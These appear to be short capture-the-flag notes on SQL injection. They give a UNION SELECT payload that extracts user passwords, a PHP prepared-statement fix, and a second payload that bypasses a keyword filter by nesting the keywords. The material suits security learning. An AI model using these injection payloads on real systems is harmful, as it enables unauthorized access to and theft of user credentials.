flag 1: 1 UNION SELECT id, password FROM users
SELECT id, username FROM users WHERE id=1 UNION SELECT id, password FROM users LIMIT 1;
To sanitize:
$stmt = $pdo->prepare("SELECT id, username FROM users WHERE id = ?");
$stmt->execute([$user_input]);


Level 2: The following keywords were found to be filtered by the application using preg_replace (): union, order, select, from, group, by. 
So we can trick it like this
1 UNUNIONION SELSELECTECT id, password FRFROMOM users
